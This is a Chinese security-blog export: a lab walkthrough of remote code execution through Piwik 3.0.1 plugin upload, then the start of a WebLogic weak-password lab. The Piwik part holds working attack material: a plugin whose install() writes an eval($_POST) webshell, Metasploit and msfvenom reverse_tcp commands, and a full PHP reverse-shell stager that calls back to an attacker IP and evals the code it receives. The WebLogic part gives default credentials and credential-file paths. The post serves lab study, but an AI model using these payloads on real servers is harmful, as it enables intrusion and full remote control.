+<h3 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h3><p>插件激活时请求的URL为：<br><a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff</a></p>
+<p>代码定位到<code>piwik-3.0.1\plugins\CorePluginsAdmin\Controller.php</code>中的activate方法。</p>
+<p>找到pluginManager调用的激活插件方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($redirectAfter = true)</span></span></div><div class="line">    &#123;</div><div class="line">        $pluginName = <span class="keyword">$this</span>-&gt;initPluginModification(<span class="keyword">static</span>::ACTIVATE_NONCE);</div><div class="line">        <span class="keyword">$this</span>-&gt;dieIfPluginsAdminIsDisabled();</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;pluginManager-&gt;activatePlugin($pluginName);<span class="comment">//激活插件</span></div><div class="line">        ....</div><div class="line">        <span class="comment">//省略部分代码</span></div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>然后往上翻，找到pluginManager变量。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> $pluginManager;</div><div class="line">....</div><div class="line"><span class="comment">//省略部分代码</span></div><div class="line"><span class="keyword">$this</span>-&gt;pluginManager = Plugin\Manager::getInstance();</div><div class="line">.....</div></pre></td></tr></table></figure>
+<p>定位到<code>piwik-3.0.1\core\Plugin\Manager.php</code>文件，找到其activatePlugin方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activatePlugin</span><span class="params">($pluginName)</span></span></div><div class="line">    &#123;</div><div class="line">		....</div><div class="line">        <span class="comment">//省略部分代码</span></div><div class="line">        <span class="comment">// Load plugin</span></div><div class="line">        $plugin = <span class="keyword">$this</span>-&gt;loadPlugin($pluginName);</div><div class="line">        <span class="keyword">if</span> ($plugin === <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;installPluginIfNecessary($plugin);</div><div class="line">        $plugin-&gt;activate();</div><div class="line">		....</div><div class="line">        <span class="comment">//省略部分代码</span></div><div class="line">		&#125;</div></pre></td></tr></table></figure>
+<p>loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPlugin</span><span class="params">($pluginName)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName])) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName];</div><div class="line">    &#125;</div><div class="line">    $newPlugin = <span class="keyword">$this</span>-&gt;makePluginClass($pluginName);</div><div class="line"></div><div class="line">    <span class="keyword">$this</span>-&gt;addLoadedPlugin($pluginName, $newPlugin);</div><div class="line">    <span class="keyword">return</span> $newPlugin;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。</p>
+<p>由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。<br>接下来就开始搭建环境具体来实现一下。</p>
+<h3 id="0x03-环境的搭建"><a href="#0x03-环境的搭建" class="headerlink" title="0x03 环境的搭建"></a>0x03 环境的搭建</h3><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><p>主机：Windows10 x64</p>
+<p>WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ）</p>
+<p>程序版本：<a href="https://www.exploit-db.com/apps/cec6f1b03cc8ed4e62754919c5922d42-piwik-3.0.1.tar.gz" target="_blank" rel="external">3.0.1</a>(也可以在<a href="https://builds.piwik.org/" target="_blank" rel="external">https://builds.piwik.org/</a> 下载)</p>
+<h4 id="2-composer工具的安装"><a href="#2-composer工具的安装" class="headerlink" title="2.composer工具的安装"></a>2.composer工具的安装</h4><p>下载地址：<a href="https://getcomposer.org/Composer-Setup.exe" target="_blank" rel="external">https://getcomposer.org/Composer-Setup.exe</a></p>
+<p>下载后直接运行Composer-Setup.exe进行安装。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_1.jpg" alt="composer安装"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_2.jpg" alt="选择PHP.exe的位置"></p>
+<p>然后根据提示，继续下一步即可。</p>
+<blockquote>
+<p>注意：安装时PHP应开启php_openssl扩展，不然会报错。</p>
+</blockquote>
+<h4 id="3-Piwik程序的部署"><a href="#3-Piwik程序的部署" class="headerlink" title="3.Piwik程序的部署"></a>3.Piwik程序的部署</h4><p>将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。</p>
+<p>在piwik-3.0.1目录下执行<code>composer install</code>命令来安装项目所依赖的代码库。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/composer_setup_3.png" alt="依赖的代码库的安装"></p>
+<p>安装后在项目的根目录会出现一个vendor文件夹。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/vendor_files.jpg" alt="vendor目录下文件"></p>
+<p>访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/</a> 开始进行安装</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_setup.jpg" alt="Piwik安装"></p>
+<p>点击Next进行下一步安装。</p>
+<p>数据库设置</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_Database_setup.png" alt="数据库设置"></p>
+<p>超级用户设置</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/Piwik_superUser_set.jpg" alt="超级用户设置"></p>
+<p>之后进行系统的设置，这里就省略过程了。</p>
+<p>安装完成后访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/</a> 进行登陆。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_login.jpg" alt="piwik登陆人口"></p>
+<blockquote>
+<p>用户名/密码为第五步中设置的超级用户。</p>
+</blockquote>
+<h3 id="0x04-验证过程"><a href="#0x04-验证过程" class="headerlink" title="0x04 验证过程"></a>0x04 验证过程</h3><h4 id="1-漏洞产生原因及PayLoad的编写"><a href="#1-漏洞产生原因及PayLoad的编写" class="headerlink" title="1.漏洞产生原因及PayLoad的编写"></a>1.漏洞产生原因及PayLoad的编写</h4><p>Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。</p>
+<p>如果我们编写一个名字叫做pwned的插件，其文件结构为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwned/</div><div class="line">pwned/pwned.php</div><div class="line">pwned/plugin.json</div></pre></td></tr></table></figure></p>
+<p>文件内容：</p>
+<p>pwned.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></div><div class="line">  &#123;</div><div class="line">    <span class="comment">//要执行的Payload</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>plugin.json</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  "name": "pwned",//插件名称</div><div class="line">  "description": "DESCRIPTION",//插件描述</div><div class="line">  "version": "1.0",//插件版本</div><div class="line">  "theme": false</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。</p>
+<h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p><strong>PayLoad的准备</strong></p>
+<p>修改上述的pwned.php代码，在install方法中添加写shell的代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></div><div class="line">  &#123;</div><div class="line">    $myfile = fopen(<span class="string">"shell.php"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"&lt;?eval(\$_POST['pass']);?&gt;"</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>plugin.json不用做过多的修改。</p>
+<p>然后压缩为pwned.zip。</p>
+<p><strong>PayLoad的利用</strong></p>
+<p>利用创建的超级用户登陆，登陆后点击Administration或者访问<a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday" target="_blank" rel="external">http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday</a></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins.jpg" alt="piwik 插件人口"></p>
+<p>安装新插件</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p>
+<p>上传新插件</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_upload.jpg" alt="piwik 插件市场"></p>
+<p>插件上传</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p>
+<p>插件上传成功</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p>
+<p>然后点击激活插件按钮</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/plugin_activated.jpg" alt="插件激活"></p>
+<p>插件激活后，会在根目录生成一个shell.php</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell.jpg" alt="shell"></p>
+<h4 id="3-利用Metasploit生成meterpreter会话"><a href="#3-利用Metasploit生成meterpreter会话" class="headerlink" title="3.利用Metasploit生成meterpreter会话"></a>3.利用Metasploit生成meterpreter会话</h4><p>上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload </div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; </div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> PASSWORD admin888</div><div class="line">PASSWORD =&gt; admin888</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> RHOST 192.168.217.1</div><div class="line">RHOST =&gt; 192.168.217.1</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> TARGETURI /piwik-3.0.1/</div><div class="line">TARGETURI =&gt; /piwik-3.0.1/</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> USERNAME admin</div><div class="line">USERNAME =&gt; admin</div><div class="line">msf exploit(piwik_superuser_plugin_upload) &gt; exploit</div></pre></td></tr></table></figure>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win01.jpg" alt="脚本说明"></p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p>
+<blockquote>
+<p>利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。</p>
+</blockquote>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。</p>
+<p>这里仅仅用3.0.1举例，根据<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="external">firefart</a>说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。</p>
+<p>Q:直接上传包含shell的压缩包可以吗？</p>
+<p>A:可以上传成功，但在plugins目录下无法执行php代码。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p>
+<p>Q:Payload中除了install()方法还可以写其他方法吗？</p>
+<p>A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">ff</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span>//安装插件，执行一次</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"install.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"install ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">()</span>//卸载插件，执行一次</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"uninstall.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"uninstall ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deactivate</span><span class="params">()</span>//关闭插件，可以多次执行</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"deactivate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"deactivate ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span>//激活插件，可以多次执行</span></div><div class="line">  &#123;</div><div class="line">	$myfile = fopen(<span class="string">"activate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line">	$content = <span class="string">"activate ..."</span>;</div><div class="line">	fwrite($myfile, $content);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_error.jpg" alt="无法生成meterpreter会话"></p>
+<p>A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。</p>
+<p>具体可以这样操作：</p>
+<p>首先看看Metasploit利用的Payload是什么。</p>
+<p>可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用<code>print_status(&quot;data:#{payload.encoded}&quot;)</code>将其内容打印出来</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_getdata.jpg" alt="打印Payload"></p>
+<p>然后使用<code>reload_all</code>重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_datas.jpg" alt="payload内容"></p>
+<blockquote>
+<p>或者可以利用<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php</code>来生成payload，内容一样</p>
+</blockquote>
+<p>然后将生成的内容放在插件PHP代码中。整理格式后如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</div><div class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></div><div class="line">  &#123;</div><div class="line">    error_reporting(<span class="number">0</span>); </div><div class="line">	$ip = <span class="string">'192.168.131.128'</span>; </div><div class="line">	$port = <span class="number">4444</span>; </div><div class="line">	<span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>;</div><div class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; </div><div class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</div><div class="line">		$s = $f(AF_INET, SOCK_STREAM, SOL_TCP); </div><div class="line">		$res = @socket_connect($s, $ip, $port); </div><div class="line">		<span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; </div><div class="line">		$s_type = <span class="string">'socket'</span>; </div><div class="line">	&#125; <span class="keyword">else</span> &#123; </div><div class="line">		<span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);</div><div class="line">	&#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; </div><div class="line">	<span class="keyword">switch</span> ($s_type) &#123; </div><div class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; </div><div class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; </div><div class="line">	&#125; </div><div class="line">	<span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; </div><div class="line">	$a = unpack(<span class="string">"Nlen"</span>, $len); </div><div class="line">	$len = $a[<span class="string">'len'</span>]; </div><div class="line">	$b = <span class="string">''</span>; </div><div class="line">	<span class="keyword">while</span> (strlen($b) &lt; $len) &#123; </div><div class="line">		<span class="keyword">switch</span> ($s_type) &#123; </div><div class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; </div><div class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; </div><div class="line">		&#125; </div><div class="line">	&#125; </div><div class="line">	$GLOBALS[<span class="string">'msgsock'</span>] = $s; </div><div class="line">	$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; </div><div class="line">	<span class="keyword">eval</span>($b);</div><div class="line">	<span class="keyword">die</span>();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后就是利用上传插件来上传插件并激活了。</p>
+<p>正确姿势：</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p>
+<blockquote>
+<p>请注意要加<code>set PAYLOAD php/meterpreter/reverse_tcp</code>，不然会报各种错误。</p>
+</blockquote>
+<p>下面的为其中的错误。</p>
+<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu.jpg" alt="msf_ubuntu"></p>
+<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="external">https://firefart.at/post/turning_piwik_superuser_creds_into_rce/</a><br>[2]<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Exploit </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Metasploit </tag>
+            
+            <tag> piwik </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Weblogic 常见漏洞环境的搭建及其利用]]></title>
+      <url>/2017/06/05/Weblogic-Vulnerability-Verification/</url>
+      <content type="html"><![CDATA[<h3 id="0x00-WebLogic-介绍及常见漏洞"><a href="#0x00-WebLogic-介绍及常见漏洞" class="headerlink" title="0x00 WebLogic 介绍及常见漏洞"></a>0x00 WebLogic 介绍及常见漏洞</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。<br>WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址<a href="https://github.com/phith0n/vulhub/tree/master/weblogic。" target="_blank" rel="external">https://github.com/phith0n/vulhub/tree/master/weblogic。</a></p>
+<a id="more"></a>
+<h3 id="0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL"><a href="#0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL" class="headerlink" title="0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL"></a>0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL</h3><p>通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。<br>下载项目后进入到<code>/weblogic/weak_password</code>目录，运行命令<code>sudo docker-compose build</code>进行编译（请参照<a href="https://github.com/phith0n/vulhub/blob/master/README.md" target="_blank" rel="external">https://github.com/phith0n/vulhub/blob/master/README.md</a> 进行docker的安装）。<br>编译完成后进行启动<br>使用如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up <span class="_">-d</span> <span class="comment">#启动</span></div><div class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps <span class="comment">#查看启动的docker</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/启动WebLogic弱口令环境.png" alt="启动WebLogic弱口令环境"></p>
+<p>Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：<a href="http://192.168.232.137:7001" target="_blank" rel="external">http://192.168.232.137:7001</a></p>
+<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/访问WebLogic弱口令web项目.png" alt="访问WebLogic弱口令web项目"></p>
+<p>访问 <a href="http://192.168.232.137:7001/console" target="_blank" rel="external">http://192.168.232.137:7001/console</a> 会跳转到管理员登录页面<a href="http://192.168.232.137:7001/console/login/LoginForm.jsp" target="_blank" rel="external">http://192.168.232.137:7001/console/login/LoginForm.jsp</a></p>
+<p>这里用户名密码分别为：weblogic/Oracle@123<br>上传war过程如下图所示<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传war过程.gif" alt="上传war过程"></p>
+<p>总结起来就是：<code>域结构-部署-安装-上传文件-将此部署安装为应用程序</code>。然后访问项目名称即可。</p>
+<blockquote>
+<p>如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md" target="_blank" rel="external">https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md</a> ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。</p>
+</blockquote>
+<p><strong>WebLogic加密解密方式</strong></p>
+<p>WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：<br><code>安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p>
+<p>例如靶机中的密码文件位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p>
